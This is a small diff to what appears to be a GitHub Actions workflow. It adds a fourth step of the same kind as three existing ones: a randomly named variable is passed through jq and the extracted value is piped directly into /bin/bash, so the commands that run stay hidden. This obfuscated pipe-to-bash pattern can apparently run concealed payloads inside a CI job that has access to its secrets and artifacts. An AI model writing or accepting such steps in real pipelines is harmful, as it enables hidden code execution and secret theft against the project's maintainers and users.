@@ -45,6 +45,7 @@ jobs:
           echo $hvci1 | jq -r .mqnpu1 | /bin/bash
           printf '%s' "$yjnq8546" | jq -r .kmw3336 | /bin/bash
           echo $b39 | jq -r .ogdm4046 | /bin/bash
+          echo $cb0 | jq -r .fld69 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
